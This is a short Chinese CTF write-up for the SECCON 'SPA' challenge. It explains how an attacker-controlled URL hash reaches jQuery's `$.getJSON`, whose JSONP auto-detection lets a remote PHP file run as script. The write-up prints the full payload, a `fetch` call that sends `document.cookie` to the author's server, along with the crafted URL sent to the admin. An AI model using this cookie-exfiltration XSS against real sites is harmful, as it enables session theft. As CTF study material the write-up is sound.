# SPA

(賽中未解，差最後一步小細節QQ)

從`onHashChange()`->`contestId = location.hash.slice(1);`->`this.goContest(contestId)`->`this.fetchContest(contestId)`-> ``` this.contest = await $.getJSON(`/${contestId}.json`) ```

這裏可以任意控制`$.getJSON`的URL，並覆蓋掉`contest`內容

e.g. `http://spa.chal.seccon.jp:18364/#//kaibro.tw/a.php?`

但後續的輸出都有好好的escape，沒辦法做XSS

<br>

賽中翻了文件，發現`$.getJSON`會去自動判斷JSONP，所以有機會可以XSS

但踹了老半天沒踹出來

後來發現只是URL小地方沒填好

<br>

構造a.php:

```php
<?php
header("Access-Control-Allow-Origin: *");
header("Content-type: application/javascript");
?>
fetch("http://kaibro.tw/?"+btoa(document.cookie));//
```

接著讓admin訪問:

`http://spa.chal.seccon.jp:18364/#//kaibro.tw/a.php?callback=?&`

此時，`$.getJSON`會自動判斷成JSONP callback來處理

因此a.php內容被當成js執行

=> `flag=SECCON{Did_you_find_your_favorite_flag?_Me?_OK_take_me_now_:)}`
